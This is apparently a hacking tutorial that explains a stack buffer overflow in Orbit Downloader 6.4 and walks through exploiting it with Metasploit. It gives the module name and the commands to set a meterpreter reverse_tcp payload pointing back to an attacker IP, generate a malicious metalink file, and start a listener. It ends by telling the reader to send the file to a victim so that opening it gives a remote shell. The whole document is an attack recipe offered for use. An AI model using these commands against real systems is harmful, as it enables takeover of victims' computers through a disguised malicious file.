Hack Remote PC using Orbit Downloader URL Unicode Conversion Overflow

This module exploits a stack-based buffer overflow in Orbit Downloader. The vulnerability is due to Orbit converting an URL ascii string to unicode in a insecure way with Multi ByteTo Wide Char. The vulnerability is exploited with a specially crafted metalink file that should be opened with Orbit through the “File->Add Metalink…” option.
Orbit Downloader 6.4 on Windows XP SP2
Orbit Downloader 6.4 on Windows 7
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type 
msf > use exploit/windows/fileformat/orbit_download_failed_bof
msf exploit (orbit_download_failed_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (orbit_download_failed_bof)>set lhost 192.168.1.4 (IP of Local Host)
msf exploit (orbit_download_failed_bof)>exploit 

After we successfully generate the malicious metalink File, it will stored on your local computer
/root/.msf4/local/msf.metalink

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
exploit 
Now send your msf.metalink files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
